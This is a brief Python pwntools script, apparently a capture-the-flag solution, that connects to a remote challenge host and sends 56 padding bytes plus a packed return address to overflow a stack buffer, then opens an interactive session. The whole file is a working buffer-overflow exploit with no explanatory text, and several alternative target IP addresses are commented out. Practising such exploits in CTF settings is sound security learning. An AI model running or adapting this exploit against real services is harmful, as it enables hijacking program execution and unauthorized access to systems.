#!/usr/bin/env python
#-*- coding:utf-8

from pwn import *

#r = remote('140.110.112.29', 2114)
#r = remote('167.99.70.213', 8888)
#r = remote('0.0.0.0', 8888)
r = remote('ctf.racterub.me', 3001)
#r = remote('10.141.0.210', 2114)
context.log_level = 'debug'
context.arch = 'amd64'

r.recvuntil('\n')
raw_input('####')
r.sendline('a'*56 + p64(0x00000000004006b6))
#raw_input('#####')
r.interactive()
